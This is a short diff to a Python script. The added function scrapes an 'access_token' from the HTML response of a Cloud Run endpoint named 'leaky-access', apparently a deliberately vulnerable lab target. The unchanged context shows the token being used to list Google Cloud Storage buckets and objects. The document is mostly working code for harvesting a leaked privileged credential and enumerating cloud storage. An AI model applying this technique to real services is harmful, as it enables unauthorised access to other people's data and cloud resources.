@@ -27,6 +27,29 @@ def get_access_token():
     else:
         raise Exception("Unable to fetch token from the server's response.")
 
+def get_privileged_access_token():
+    # Define URL for the GET request
+    url = "https://leaky-access-jobztbckaq-uc.a.run.app/result"
+   
+    headers = {
+        "Content-Type": "application/x-www-form-urlencoded",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36"
+    }
+
+    response = requests.post(url, data={}, headers=headers)
+
+    soup = BeautifulSoup(response.content, "html.parser")
+    
+    # Find the table cell (td) with the token data
+    token_data_cell = soup.find("td")
+    if token_data_cell:
+        # Parse the token JSON string and retrieve the 'access_token' field
+        token_data = json.loads(token_data_cell.text.replace("&#34;", '"'))
+        return token_data["access_token"]
+    else:
+        raise Exception("Unable to fetch token from the server's response.")
+
+
 def list_buckets_and_objects_urls(project_id, access_token):
     endpoint = f'https://storage.googleapis.com/storage/v1/b?project={project_id}'
     headers = {
